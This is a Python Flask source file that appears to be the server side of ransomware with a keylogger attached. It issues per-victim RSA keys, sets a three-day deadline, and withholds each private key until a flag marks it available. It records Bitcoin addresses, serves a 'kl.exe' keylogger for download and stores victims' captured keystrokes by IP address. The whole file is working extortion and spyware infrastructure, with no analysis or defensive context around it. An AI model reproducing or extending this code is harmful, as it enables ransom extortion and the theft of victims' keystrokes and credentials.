from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
from flask_restful import Resource
import database
import json
from flask import jsonify, request, send_from_directory
from datetime import datetime, timedelta
import os

class KeyGen(Resource):
    def get(self):
        client, collection = database.connection()

        private_key = rsa.generate_private_key(
            public_exponent=65537,
            key_size=2048,
        )

        public_key = private_key.public_key()

        private_pem = private_key.private_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PrivateFormat.PKCS8,
            encryption_algorithm=serialization.NoEncryption()
        )

        public_pem = public_key.public_bytes(
            encoding=serialization.Encoding.PEM,
            format=serialization.PublicFormat.SubjectPublicKeyInfo
        )
        print(private_pem)
        private_pem = private_pem.decode('UTF-8').replace('\n','')
        public_pem = public_pem.decode('UTF-8').replace('\n','')

        database.freshInsert(private_pem,public_pem)
        
        now = datetime.now()+timedelta(days=3)
        time=now.strftime("%d/%m/%Y %H:%M:%S")

        return {"public_key" : public_pem, "time" : time}, 200
        

class KeyGetter(Resource):
    def get(self):
        client, collection =  database.connection()
        
        data=request.json
        public_key=data["public_key"]

        print(public_key)
        record_id=None
        records =list(collection.find({}, {"public_key":1}))

        for r in records:
            if public_key in r['public_key']:
                record_id=r['_id']
                print("test")
                break

        record=collection.find_one({"_id": record_id})
        print(record['private_key']) 
        if record['isAvailable'] == 1:
            return {'private_key' : record['private_key']}, 200
        else:
            return {'private_key' : 'Key not available'}, 400

class BTCAddressGetter(Resource):
    def post(self):
        client, collection = database.connection()
        
        data=request.json
        public_key=data["public_key"]
        btc_address=data["btc_address"]

        record_id=None
        records =list(collection.find({}, {"public_key":1}))
        print(public_key)
        for r in records:
            #r.update({"public_key" : r["public_key"].replace('/','').replace('+','')})
            if public_key in r['public_key']:
                record_id=r['_id']
                print("test")
                break

        record = collection.update_one({"_id":record_id}, {"$set": {"BTCAddress":btc_address}})
        return {'public_key' : public_key, 'address' : btc_address}, 200

class KeyLogger(Resource):
    def get(self):
        return send_from_directory(directory='', path='kl.exe', as_attachment=True)
    
    def post(self):
        data=request.json
        ip_address=request.remote_addr
        print(data['text'])
        print(ip_address)
        
        if not os.path.isfile("keylogger_data/"+str(ip_address)+".txt"):
            with open("keylogger_data/"+str(ip_address)+".txt",'w') as txt_file:
                txt_file.write(data["text"]+"\n")
        else:
            with open("keylogger_data/"+str(ip_address)+".txt",'a') as txt_file:
                txt_file.write(data["text"]+"\n")

        return 200

class isAlive(Resource):
    def get(self):
        return 200
      
